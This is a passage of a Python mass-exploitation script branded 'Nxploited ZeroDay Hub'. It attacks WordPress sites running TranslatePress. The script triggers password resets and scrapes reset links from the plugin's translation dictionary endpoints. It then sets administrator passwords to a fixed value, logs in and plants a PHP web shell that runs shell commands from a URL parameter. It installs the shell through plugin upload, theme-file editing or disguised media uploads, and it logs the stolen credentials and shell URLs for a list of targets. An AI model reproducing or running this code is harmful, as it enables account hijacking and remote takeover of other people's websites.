        if not theme:
            return None
        shell_code = f'<?php if(isset($_GET["nx"])&&$_GET["nx"]=="{SIG}"){{echo "{SIG}";if(isset($_GET["cmd"]))echo "<pre>".shell_exec($_GET["cmd"])."</pre>";die();}}'
        for tfile in ["404.php", "footer.php", "header.php"]:
            data = {
                "_wpnonce": nm.group(1),
                "_wp_http_referer": "/wp-admin/theme-editor.php",
                "newcontent": shell_code,
                "action": "update",
                "file": tfile,
                "theme": theme,
                "submit": "Update File",
            }
            r2 = sess.post(f"{base}/wp-admin/theme-editor.php", data=data, timeout=TIMEOUT)
            if r2.status_code == 200 and ("updated successfully" in r2.text.lower() or "file edited" in r2.text.lower()):
                shell_url = f"{base}/wp-content/themes/{theme}/{tfile}?nx={SIG}"
                try:
                    rv = sess.get(shell_url, timeout=TIMEOUT)
                    if SIG in rv.text:
                        return shell_url
                except Exception:
                    pass
    except Exception:
        pass
    return None


def try_media_upload(sess, base):
    try:
        r = sess.get(f"{base}/wp-admin/media-new.php", timeout=TIMEOUT)
        if r.status_code != 200:
            return None
        nm = re.search(r'name="_wpnonce"\s+value="([^"]+)"', r.text)
        if not nm:
            return None
        php_content = f'<?php if(isset($_GET["nx"])&&$_GET["nx"]=="{SIG}"){{echo "{SIG}";if(isset($_GET["cmd"]))echo "<pre>".shell_exec($_GET["cmd"])."</pre>";die();}}'
        for fname, ctype in [("nx.php", "application/x-php"), ("nx.phtml", "application/x-php"), ("nx.php.jpg", "image/jpeg")]:
            files = {'async-upload': (fname, php_content.encode(), ctype)}
            data = {'_wpnonce': nm.group(1), 'action': 'upload-attachment'}
            r2 = sess.post(f"{base}/wp-admin/async-upload.php", data=data, files=files, timeout=TIMEOUT)
            if r2.status_code == 200:
                try:
                    j = r2.json()
                    if j.get("success") and j.get("data", {}).get("url"):
                        u = j["data"]["url"]
                        rv = sess.get(f"{u}?nx={SIG}", timeout=TIMEOUT)
                        if SIG in rv.text:
                            return f"{u}?nx={SIG}"
                except Exception:
                    pass
    except Exception:
        pass
    return None


def upload_shell(sess, base):
    shell_url = try_plugin_upload(sess, base)
    if shell_url:
        return shell_url, "plugin_upload"
    shell_url = try_theme_editor(sess, base)
    if shell_url:
        return shell_url, "theme_editor"
    shell_url = try_media_upload(sess, base)
    if shell_url:
        return shell_url, "media_upload"
    return None, None


def show_takeover_card(base, username, shell_url, method):
    txt = Text()
    txt.append("ACCOUNT TAKEOVER + SHELL UPLOADED\n\n", style="ok")
    txt.append("Target   : ", style="accent")
    txt.append(f"{base}\n", style="info")
    txt.append("Username : ", style="accent")
    txt.append(f"{username}\n", style="highlight")
    txt.append("Password : ", style="accent")
    txt.append(f"{FIXED_PASS}\n", style="highlight")
    txt.append("Shell    : ", style="accent")
    txt.append(f"{shell_url}\n", style="ok")
    txt.append("Method   : ", style="accent")
    txt.append(f"{method}\n", style="info")
    txt.append("Sig      : ", style="accent")
    txt.append(f"{SIG}\n", style="dim")
    console.print(Panel(txt, title="[ok]TAKEOVER[/]", border_style="ok", box=box.ROUNDED))


def exploit_target(base):
    sess = mk_sess()
    try:
        has_trp, page_html = detect_translatepress(sess, base)
        if not has_trp:
            return "safe"

        console.print(f"[info]TRANSLATEPRESS[/] {base}")

        trp_data = get_nonce_and_data(sess, base, initial_html=page_html)

        nonce = None
        if trp_data:
            nonce = trp_data.get("gettranslationsnonceregular")

        languages, default_lang = detect_languages(trp_data, page_html, base)

        if nonce:
            console.print(f"[ok]NONCE[/] {base} [dim]({nonce[:12]}... | langs={','.join(languages[:5])} | default={default_lang})[/]")
        else:
            console.print(f"[warn]NO_NONCE[/] {base} [dim](langs={','.join(languages[:5])} | default={default_lang})[/]")

        if nonce and languages:
            accessible, acc_err = test_endpoint_accessible(sess, base, nonce, languages[0])
            if not accessible:
                console.print(f"[warn]ENDPOINT_FAIL[/] {base} [dim]({acc_err})[/]")
                nonce = None

        users = enumerate_usernames(sess, base)
        console.print(f"[info]USERS[/] {base} [dim]({', '.join(users[:5])})[/]")

        reset_triggered = False
        for user in users[:5]:
            ok, detail = trigger_password_reset(sess, base, user)
            if ok:
                console.print(f"[ok]RESET_SENT[/] {base} [dim](user={user})[/]")
                reset_triggered = True
            else:
                console.print(f"[warn]RESET_FAIL[/] {base} [dim](user={user}: {detail})[/]")

        if reset_triggered:
            time.sleep(3)

        all_reset_links = []
        dict_max_id = 0
        found_lang = None

        for lang in languages:
            if nonce:
                links, mid = search_dictionary_by_ids(sess, base, nonce, lang)
                if mid > dict_max_id:
                    dict_max_id = mid
                if links:
                    all_reset_links.extend(links)
                    found_lang = lang
                    console.print(f"[ok]LINKS_FOUND[/] {base} [dim](lang={lang}, count={len(links)}, max_id={dict_max_id}, method=id_enum)[/]")
                    break

            trp_links = search_dictionary_by_trp_ajax(sess, base, lang, default_lang)
            if trp_links:
                all_reset_links.extend(trp_links)
                found_lang = lang
                console.print(f"[ok]LINKS_FOUND[/] {base} [dim](lang={lang}, count={len(trp_links)}, method=trp_ajax)[/]")
                break

        if not found_lang and languages:
            found_lang = languages[0]

        all_reset_links = list(set(all_reset_links))

        link_users = set()
        for link in all_reset_links:
            m = re.search(r'login=([^&\s"\']+)', link)
            if m and m.group(1) not in users:
                link_users.add(m.group(1))
        if link_users:
            console.print(f"[info]DICT_USERS[/] {base} [dim]({', '.join(link_users)})[/]")
            users = list(link_users) + users

        for attempt in range(3):
            if attempt > 0:
                console.print(f"[info]RETRY[/] {base} [dim](attempt {attempt+1}/3 - triggering fresh reset)[/]")
                for user in users[:5]:
                    ok, detail = trigger_password_reset(sess, base, user)
                    if ok:
                        console.print(f"[ok]RESET_SENT[/] {base} [dim](user={user}, retry={attempt+1})[/]")
                time.sleep(5)
                fresh_links = []
                search_lang = found_lang or (languages[0] if languages else "en_US")

                if nonce and dict_max_id > 0:
                    tail_start = max(1, dict_max_id - 200)
                    tail_empty = 0
                    while tail_empty < 8 and tail_start <= dict_max_id + 5000:
                        ids = list(range(tail_start, tail_start + 100))
                        result, err = query_dictionary_admin_ajax(sess, base, nonce, search_lang, string_ids=ids)
                        if err and ("nonce" in str(err).lower() or "reject" in str(err).lower()):
                            break
                        if result and isinstance(result, (list, dict)):
                            entry_count = len(result) if isinstance(result, list) else len(result.keys())
                            if entry_count > 0:
                                tail_empty = 0
                                dict_max_id = max(dict_max_id, tail_start + 100)
                                found = extract_reset_links(result)
                                if found:
                                    fresh_links.extend(found)
                            else:
                                tail_empty += 1
                        else:
                            tail_empty += 1
                        tail_start += 100

                if not fresh_links and nonce:
                    for lang in languages:
                        links_full, mid = search_dictionary_by_ids(sess, base, nonce, lang)
                        if mid > dict_max_id:
                            dict_max_id = mid
                        if links_full:
                            fresh_links.extend(links_full)
                            break

                if not fresh_links:
                    trp_found = search_dictionary_by_trp_ajax(sess, base, search_lang, default_lang)
                    if trp_found:
                        fresh_links.extend(trp_found)

                new_only = [l for l in set(fresh_links) if l not in all_reset_links]
                if new_only:
                    console.print(f"[ok]NEW_LINKS[/] {base} [dim](count={len(new_only)}, max_id={dict_max_id})[/]")
                    all_reset_links = new_only + all_reset_links
                else:
                    console.print(f"[warn]NO_NEW_LINKS[/] {base} [dim](retry {attempt+1}, searched to {dict_max_id + 5000})[/]")
                    continue

            all_expired = True
            for link in all_reset_links:
                link_user = ""
                m = re.search(r'login=([^&\s]+)', link)
                if m:
                    link_user = m.group(1)

                ok, username, reason = change_password(sess, link)

                if not ok:
                    if reason in ("EXPIRED_URL", "EXPIRED", "NO_FORM"):
                        console.print(f"[warn]LINK_EXPIRED[/] {base} [dim](user={link_user}, status={reason})[/]")
                    else:
                        console.print(f"[fail]PASS_CHANGE_FAIL[/] {base} [dim](user={username or link_user}, reason={reason})[/]")
                    continue

                all_expired = False
                console.print(f"[ok]PASS_CHANGED[/] {base} [dim](user={username}, pass={FIXED_PASS})[/]")

                login_sess = mk_sess()
                logged_in = wp_login(login_sess, base, username, FIXED_PASS)
                if not logged_in:
                    console.print(f"[fail]LOGIN_FAIL[/] {base} [dim](user={username})[/]")
                    login_sess.close()
                    continue

                console.print(f"[ok]LOGGED_IN[/] {base} [dim](user={username})[/]")

                shell_url, method = upload_shell(login_sess, base)
                login_sess.close()

                if shell_url:
                    show_takeover_card(base, username, shell_url, method)
                    write_shell(f"{base}/wp-login.php user: {username} pass: {FIXED_PASS} shell: {shell_url} method: {method} sig: {SIG}")
                    return "takeover"
                else:
                    console.print(f"[fail]UPLOAD_FAIL[/] {base} [dim](all methods failed)[/]")
                    write_shell(f"{base}/wp-login.php user: {username} pass: {FIXED_PASS} shell: NO_SHELL sig: {SIG}")
                    return "takeover"

            if not all_expired:
                break

        return "vuln"

    except Exception as e:
        console.print(f"[fail]ERROR[/] {base} [dim]({str(e)[:80]})[/]")
        return "error"
    finally:
        sess.close()


def worker():
    while True:
        try:
            base = targets_queue.get_nowait()
        except Empty:
            return
        result = exploit_target(base)
        with stats_lock:
            stats["done"] += 1
            if result == "takeover":
                stats["takeover"] += 1
            elif result == "vuln":
                stats["vuln"] += 1
            elif result == "safe":
                stats["safe"] += 1
            else:
                stats["error"] += 1
        targets_queue.task_done()


def print_progress():
    with stats_lock:
        t, d, tk, v, s, e = stats["total"], stats["done"], stats["takeover"], stats["vuln"], stats["safe"], stats["error"]
    ln = Text()
    ln.append("[", style="dim")
    ln.append("Progress", style="accent")
    ln.append("] ", style="dim")
    ln.append(f"{d}/{t} ", style="info")
    ln.append("TAKEOVER:", style="ok")
    ln.append(f"{tk} ", style="ok")
    ln.append("VULN:", style="card")
    ln.append(f"{v} ", style="card")
    ln.append("SAFE:", style="dim")
    ln.append(f"{s} ", style="dim")
    ln.append("ERR:", style="fail")
    ln.append(f"{e}", style="fail")
    console.print(ln)


def run():
    set_terminal_title("Nxploited ZeroDay Hub | CVE-2026-19632")
    os.system("cls" if os.name == "nt" else "clear")
    full_banner()

    raw_tf = console.input("[accent]Targets file (default list.txt): [/]").strip() or "list.txt"
    tf = resolve_path(raw_tf)
    if not os.path.exists(tf):
        console.print(f"[fail]File not found: {tf}[/]")
        return

    count = sum(1 for l in open(tf, "r", encoding="utf-8", errors="ignore") if l.strip())
    console.print(f"[ok]Found:[/] {tf} ({count} targets)")

    tr = console.input(f"[accent]Threads (default {DEFAULT_THREADS}): [/]").strip()
    try:
        threads = int(tr) if tr else DEFAULT_THREADS
    except Exception:
        threads = DEFAULT_THREADS
    threads = max(1, threads)

    sites = []
    with open(tf, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            u = ln.strip()
            if not u:
                continue
            if not u.lower().startswith(("http://", "https://")):
                u = "https://" + u
            sites.append(u.rstrip("/"))

    if not sites:
        console.print("[fail]No targets[/]")
        return

    shells_path = os.path.join(SCRIPT_DIR, SHELLS_FILE)
    console.print(f"\n[ok]Loaded {len(sites)} target(s) | {threads} thread(s)[/]")
    console.print(f"[dim]Shells -> {shells_path}[/]\n")

    for s in sites:
        targets_queue.put(s)
    with stats_lock:
        stats.update({"total": len(sites), "done": 0, "takeover": 0, "vuln": 0, "safe": 0, "error": 0})

    workers = []
    for _ in range(min(threads, len(sites))):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        workers.append(t)

    last = -1
    while True:
        with stats_lock:
            d, t = stats["done"], stats["total"]
        if d != last:
            print_progress()
            last = d
        if d >= t:
            break
        time.sleep(0.5)

    targets_queue.join()
    for t in workers:
        t.join(timeout=0.3)

    console.print()
    print_progress()

    with stats_lock:
        tk, v, s, e = stats["takeover"], stats["vuln"], stats["safe"], stats["error"]

    tbl = Table(box=box.ROUNDED, border_style="accent", title="Summary")
    tbl.add_column("Status", style="accent")
    tbl.add_column("Count", justify="right")
    tbl.add_row("[ok]TAKEOVER[/]", f"[ok]{tk}[/]")
    tbl.add_row("[card]VULN[/]", f"[card]{v}[/]")
    tbl.add_row("[dim]SAFE[/]", f"[dim]{s}[/]")
    tbl.add_row("[fail]ERROR[/]", f"[fail]{e}[/]")
    console.print(tbl)

    console.print(Panel(
        Text.from_markup(f"[ok]Shells -> {shells_path}[/]"),
        border_style="ok", box=box.ROUNDED,
    ))


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        console.print("\n[fail]Interrupted.[/]")
